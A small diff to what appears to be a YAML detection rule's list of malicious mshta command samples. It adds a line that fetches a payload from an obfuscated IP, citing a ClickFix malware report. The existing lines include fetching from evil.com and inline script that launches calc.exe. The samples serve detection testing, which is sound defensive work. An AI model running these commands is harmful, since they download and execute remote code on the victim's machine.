@@ -8,6 +8,7 @@ pattern: |
 
 malicious:
   - "mshta http://evil.com/payload.hta"
+  - "mshta http://81.0x5a.29.64/ebc/rps.gz" #https://www.huntress.com/blog/clickfix-malware-buried-in-images
   - "mshta javascript:alert('XSS');close();"
   - 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc.exe"")")'
   - "mshta about:<html><script>alert('xss')</script></html>"
